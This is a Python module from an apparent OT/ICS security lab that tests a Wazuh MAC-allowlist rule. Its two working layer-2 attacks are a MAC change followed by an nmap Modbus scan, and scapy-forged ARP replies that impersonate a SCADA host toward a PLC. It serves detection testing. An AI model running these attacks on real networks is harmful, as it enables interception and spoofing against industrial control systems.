#!/usr/bin/env python3
"""Ataques L2 que fuerzan apariciones de un par (ip, mac) no inventariado,
pensados para disparar la regla Wazuh 100310 (allowlist MAC).

Dos acciones:

  (1) `mac_change_scan`:
      Cambia la MAC de kali_nodo (ip link set eth0 address <mac>) y lanza
      un sondeo (nmap Modbus) contra la zona OT. El router_gw captura
      paquetes con src_ip=192.168.20.66 (kali) y src_mac=<mac inventada>:
      el par (20.66, mac_falsa) no esta en mac_ok -> 100310 dispara.
      Al terminar restaura la MAC original.

  (2) `arp_spoof`:
      Envia respuestas ARP gratuitas falsas en red_control (modo control)
      diciendo "20.10 (SCADA) esta en MI MAC". Pcap2macs extrae el par
      (20.10, mac_kali) de la seccion ARP del paquete; ese par no esta en
      mac_ok (en mac_ok esta 20.10 con la MAC real de SCADA) -> 100310
      dispara. Es MITM clasico sin dependencias externas (scapy stdlib).

Requisitos de kali_nodo:
  - cap_add: NET_ADMIN (ya configurado en compose) para `ip link set`.
  - scapy opcional (se instala al vuelo si falta).

Modo kali: estas acciones requieren modo 'control' (kali en 192.168.20.66,
red_control). En modo 'empresa' la MAC capturada seria la de router_gw
despues del NAT, no la del atacante.
"""
from __future__ import annotations

import os
import subprocess
import time

import config
from core import runner, evidence


# Pares (ip, mac) MITRE: cambio de MAC = Masquerading (ICS T0849 / Enterprise
# T1036); ARP spoof = AiTM (ICS T0859 / Enterprise T1557.002).
MITRE_MAC_CHANGE = ["T0849", "T1036"]
MITRE_ARP_SPOOF  = ["T0859", "T1557"]


def _ejecutar_en_kali(cmd, sink):
    """Ejecuta un comando directamente dentro de kali_nodo (no via proxychains)."""
    if sink:
        sink(f"[+] {' '.join(cmd)}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if r.stdout and sink:
            sink(r.stdout.rstrip())
        if r.returncode != 0 and sink:
            sink(f"[-] exit={r.returncode}; stderr: {r.stderr.rstrip()}")
        return r.returncode
    except subprocess.TimeoutExpired:
        if sink:
            sink("[-] Timeout.")
        return 124


def _get_mac(iface, sink):
    """Lee la MAC actual de la interfaz."""
    try:
        with open(f"/sys/class/net/{iface}/address", "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception as e:
        if sink:
            sink(f"[-] No se puede leer /sys/class/net/{iface}/address: {e}")
        return None


def _get_routes(iface, sink):
    """Captura las rutas estaticas que dependen de la interfaz, para poder
    re-instalarlas tras el link flap (set link down/up las elimina)."""
    try:
        r = subprocess.run(["ip", "route", "show", "dev", iface],
                           capture_output=True, text=True, timeout=5)
        return [l.strip() for l in r.stdout.splitlines() if l.strip()]
    except Exception as e:
        sink(f"[-] No se pudieron leer rutas de {iface}: {e}")
        return []


def _restore_routes(iface, rutas, sink):
    for linea in rutas:
        # `ip route show dev <iface>` imprime p.ej. "192.168.10.0/24 via 192.168.20.254"
        # (sin "dev"); al restaurar lo re-adjuntamos.
        if " dev " in linea:
            cmd = ["ip", "route", "replace"] + linea.split()
        else:
            cmd = ["ip", "route", "replace"] + linea.split() + ["dev", iface]
        _ejecutar_en_kali(cmd, sink)


def _set_mac(iface, mac, sink):
    """Cambia la MAC de la interfaz. Requiere NET_ADMIN. Preserva rutas:
    `ip link set down/up` las borra, asi que las recapturamos y re-instalamos.
    """
    rutas = _get_routes(iface, sink)
    for cmd in (["ip", "link", "set", "dev", iface, "down"],
                ["ip", "link", "set", "dev", iface, "address", mac],
                ["ip", "link", "set", "dev", iface, "up"]):
        rc = _ejecutar_en_kali(cmd, sink)
        if rc != 0:
            return False
    # Re-instala rutas (sobre todo las de /24 que apuntan a router_gw y que
    # inyecta net_setup_kali en modo control).
    if rutas:
        _restore_routes(iface, rutas, sink)
    return True


def mac_change_scan(target=None, fake_mac="de:ad:be:ef:ca:fe", iface="eth0", sink=None):
    """Cambia la MAC de kali y lanza un nmap. Restaura al terminar.

    El trafico generado llevara src_ip=192.168.20.66 (kali) y
    src_mac=`fake_mac`: par (20.66, fake_mac) nuevo => 100310 dispara.
    """
    target = target or "192.168.10.0/24"
    runner.assert_lab_target(target) if "/" not in target else None

    path = evidence.new_evidence_file("mac_spoof", "mac_change_scan")
    evidence.header(path, f"MAC spoof (cambio de MAC + scan) -> {target}",
                    target, MITRE_MAC_CHANGE)

    def sink_file(line):
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        if sink:
            sink(line)

    # 1) Guardar MAC original.
    original = _get_mac(iface, sink_file)
    if not original:
        sink_file(f"[-] No se pudo leer la MAC original de {iface}; abortando.")
        return path
    sink_file(f"[*] MAC original de {iface}: {original}")

    try:
        # 2) Cambiar a la MAC falsa.
        sink_file(f"[*] Cambiando MAC {iface}: {original} -> {fake_mac}")
        if not _set_mac(iface, fake_mac, sink_file):
            sink_file("[-] Fallo cambiando la MAC; abortando.")
            return path

        ahora = _get_mac(iface, sink_file)
        sink_file(f"[+] MAC activa: {ahora}")

        # 3) Pausa breve para que la nueva MAC se propague por ARP si procede.
        time.sleep(1)

        # 4) Generar trafico OT con la MAC falsa (nmap scan Modbus).
        sink_file(f"[*] Lanzando nmap Modbus contra {target} con MAC {fake_mac}...")
        _ejecutar_en_kali(["nmap", "-sT", "-Pn", "-p", "502",
                           "--script", "modbus-discover", target], sink_file)
    finally:
        # 5) Restaurar MAC original SIEMPRE.
        sink_file(f"[*] Restaurando MAC original {original}...")
        if _set_mac(iface, original, sink_file):
            sink_file("[+] MAC restaurada.")
        else:
            sink_file(f"[!] Fallo restaurando MAC; estado actual: {_get_mac(iface, sink_file)}")

    sink_file("[+] Terminado. El par (192.168.20.66, " + fake_mac + ") "
              "debe aparecer en all_macs.json y disparar Wazuh 100310.")
    return path


def arp_spoof(target_ip=None, impersonate_ip=None, iface="eth0",
              count=5, sink=None):
    """Envia ARP replies gratuitos diciendo que `impersonate_ip` tiene la MAC
    de kali. Usa scapy (se auto-instala si falta). MITM primitiva.

    Por defecto spoofea a plc_agua_1 (10.10) haciendose pasar por SCADA
    (20.10). El PCAP captura la ARP con hwsrc=mac_kali y psrc=20.10:
    pcap2macs extrae el par (20.10, mac_kali) -> no esta en mac_ok ->
    100310 dispara.
    """
    target_ip      = target_ip      or "192.168.10.10"  # plc_agua_1 (victima)
    impersonate_ip = impersonate_ip or "192.168.20.10"  # SCADA (suplantada)

    path = evidence.new_evidence_file("mac_spoof", "arp_spoof")
    evidence.header(path, f"ARP spoof (MITM): {impersonate_ip} -> {target_ip}",
                    f"{impersonate_ip} -> {target_ip}", MITRE_ARP_SPOOF)

    def sink_file(line):
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        if sink:
            sink(line)

    # Instalar scapy si falta.
    try:
        import scapy.all  # noqa: F401
    except ImportError:
        sink_file("[*] scapy no instalado; instalando con pip (--break-system-packages)...")
        _ejecutar_en_kali(
            ["pip3", "install", "--break-system-packages", "--quiet", "scapy"],
            sink_file,
        )
        try:
            import scapy.all  # noqa: F401
        except ImportError as e:
            sink_file(f"[-] No se pudo instalar scapy: {e}; abortando.")
            return path

    from scapy.all import ARP, Ether, sendp, get_if_hwaddr  # noqa: E402

    try:
        mac_atacante = get_if_hwaddr(iface)
    except Exception as e:
        sink_file(f"[-] No se puede obtener la MAC de {iface}: {e}")
        return path

    sink_file(f"[*] MAC atacante ({iface}): {mac_atacante}")
    sink_file(f"[*] Suplantando a {impersonate_ip} -> victima {target_ip}")
    sink_file(f"[*] Enviando {count} ARP reply(s) 'gratuitos'...")

    # ARP reply: pretendemos ser impersonate_ip y mandamos la "respuesta"
    # a target_ip. hwsrc=mac_atacante, psrc=impersonate_ip.
    pkt = Ether(src=mac_atacante, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,                       # 2 = ARP reply (gratuitous si va a broadcast)
        hwsrc=mac_atacante,
        psrc=impersonate_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        pdst=target_ip,
    )

    try:
        sendp(pkt, iface=iface, count=count, inter=0.5, verbose=False)
        sink_file(f"[+] {count} ARP reply(s) enviados.")
    except Exception as e:
        sink_file(f"[-] sendp fallo: {e}")
        return path

    sink_file(f"[+] Terminado. El par ({impersonate_ip}, {mac_atacante}) "
              "debe aparecer en all_macs.json y disparar Wazuh 100310.")
    return path
